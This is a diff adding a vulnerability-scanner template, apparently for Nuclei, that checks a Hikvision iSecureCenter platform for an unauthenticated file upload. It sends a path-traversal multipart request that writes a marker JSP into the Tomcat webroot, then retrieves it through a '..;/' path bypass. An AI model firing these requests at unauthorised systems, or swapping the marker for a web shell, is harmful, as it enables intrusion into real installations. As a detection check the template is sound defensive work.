@@ -1,0 +1,33 @@
+id: Hikvision_13_2
+info:
+  name: 海康威视iSecureCenter综合安防管理平台 svm文件上传poc2
+  author: YanXi
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: Hikvision
+http:
+  - raw:
+      - |+
+        POST /svm/api/external/report HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a
+        Content-Length: 308
+
+        ------WebKitFormBoundary9PggsiM755PLa54a
+        Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
+        Content-Type: application/zip
+
+        <%out.print("testax");%>
+
+        ------WebKitFormBoundary9PggsiM755PLa54a--
+
+      - |+
+        GET /portal/ui/login/..;/..;/new.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body_2, 'testax') "
